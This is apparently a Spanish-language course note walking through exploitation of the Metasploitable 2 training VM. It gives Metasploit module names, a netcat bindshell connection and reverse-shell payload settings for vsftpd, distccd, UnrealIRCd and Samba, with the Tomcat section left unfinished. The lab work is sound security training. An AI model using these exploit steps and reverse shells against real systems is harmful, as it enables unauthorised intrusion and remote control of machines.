---
title: Práctica Meterpreter
modulo: M4 - Explotación y Post-Explotación
fecha: 2025-07-23
vm: https://drive.google.com/drive/folders/17_s4xiWqbh-mRCX5FazMp-pEpokJBE70
layout: apunte
slug: 2025-07-23-prctica-meterpreter
---
# Explotación a Metasploitable 2

## 1. vsftp
- Tiene **backdoor con shell root instantánea**.
- Exploit: `unix/ftp/vsftpd_234_backdoor`.


## 2. bindshell
- Es literalmente un shell root abierto.
- Explot (Desde la kali): `nc 10.0.2.17 1524`

![[metasploit_bindshell.png]]


## 3. distccd
- Explotable para RCE
- Exploit: `unix/misc/distcc_exec`

```bash
use exploit/unix/misc/distcc_exec
```

Configuración de objetivo y payload (Perl)
```bash
set RHOSTS 10.0.2.17
set RPORT 3632
set PAYLOAD cmd/unix/reverse_perl
set LHOST 10.0.2.6     
set LPORT 4444
run
```
🔹 **Donde:**
- `RHOSTS` es la IP de la víctima (la Metasploitable)
- `RPORT` es el puerto donde corre distccd
- `PAYLOAD` es la shell reversa
- `LHOST` la IP del atacante (la Kali)

![[metasploit_distccd.png]]


## 4. UnrealIRCd
- Versión vulnerable con backdoor RCE
- Exploit: `unix/irc/unreal_ircd_3281_backdoor`

Configuración de objetivo y payload:
```bash
set RHOSTS 10.0.2.17
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.2.6
set LPORT 4444
run
```
![[metasploit_unreall.png]]


## 5. Samba
- Varias vulnerabilidades conocidas (RCE).
- Exploit típico: `exploit/multi/samba/usermap_script`.

```bash
use exploit/multi/samba/usermap_script
```

Configuración de parámetros:
```bash
set RHOSTS 10.0.2.17
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.2.6
set LPORT 4444
run
```
![[meterpreter_samba.png]]

## 6. Apache Tomcat
- Permite subida de WAR maliciosos si hay credenciales por defecto.
#Pendiente

